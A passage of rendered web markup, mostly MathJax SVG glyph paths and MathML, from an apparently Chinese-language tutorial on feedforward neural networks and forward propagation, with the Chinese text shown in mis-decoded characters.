90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(8733.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mstyle" transform="translate(9011.4,0)"><g data-mml-node="mspace"/><g data-mml-node="msup" transform="translate(10178,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(11671.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(12727.5,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13298.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(13687.5,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(14839.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>,</mo><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mi>Ïƒ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li><li><p><strong>è¾“å‡ºå±‚</strong><br>ç»™å‡ºæœ€ç»ˆç»“æœï¼Œå¦‚åˆ†ç±»æ¦‚ç‡ã€å›å½’æ•°å€¼ç­‰ã€‚<br>é€šå¸¸ä¼šæ ¹æ®ä»»åŠ¡é€‰ç”¨ä¸åŒæ¿€æ´»å‡½æ•°ï¼ˆå¦‚ softmaxã€sigmoidã€linearï¼‰</p></li></ol><h3 id="å‰å‘ä¼ æ’­ï¼ˆForward-Propagationï¼‰">å‰å‘ä¼ æ’­ï¼ˆForward Propagationï¼‰</h3><h4 id="åŸºæœ¬æµç¨‹">åŸºæœ¬æµç¨‹</h4><p>å‡è®¾æœ‰ä¸€ä¸ªç®€å•çš„å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFeedforward Neural Networkï¼‰ï¼Œå®ƒç”±ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>è¾“å…¥å±‚ï¼ˆInput Layerï¼‰</li><li>ä¸€ä¸ªæˆ–å¤šä¸ªéšè—å±‚ï¼ˆHidden Layersï¼‰</li><li>è¾“å‡ºå±‚ï¼ˆOutput Layerï¼‰</li></ul><p>æ¯ä¸€å±‚çš„ç¥ç»å…ƒé€šè¿‡æƒé‡ï¼ˆweightsï¼‰å’Œåç½®ï¼ˆbiasesï¼‰è¿æ¥ã€‚</p><p><strong>å¯¹äºç¬¬ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> å±‚çš„å‘å‰ä¼ æ’­æ­¥éª¤å¦‚ä¸‹ï¼š</strong></p><ol><li><p><strong>åŠ æƒæ±‚å’Œ</strong></p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="19.759ex" height="2.32ex" role="img" focusable="false" viewbox="0 -943.3 8733.4 1025.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1429.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2485.4,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4275.5,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6617.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7617.5,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container><p>å…¶ä¸­ï¼š</p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="4.05ex" height="2.071ex" role="img" focusable="false" viewbox="0 -893.3 1790.1 915.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼šç¬¬ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> å±‚çš„æƒé‡çŸ©é˜µ</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="4.795ex" height="2.044ex" role="img" focusable="false" viewbox="0 -893.3 2119.6 903.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼šä¸Šä¸€å±‚çš„è¾“å‡ºï¼ˆæˆ–è¾“å…¥å±‚çš„åŸå§‹è¾“å…¥ï¼‰</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.525ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1115.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 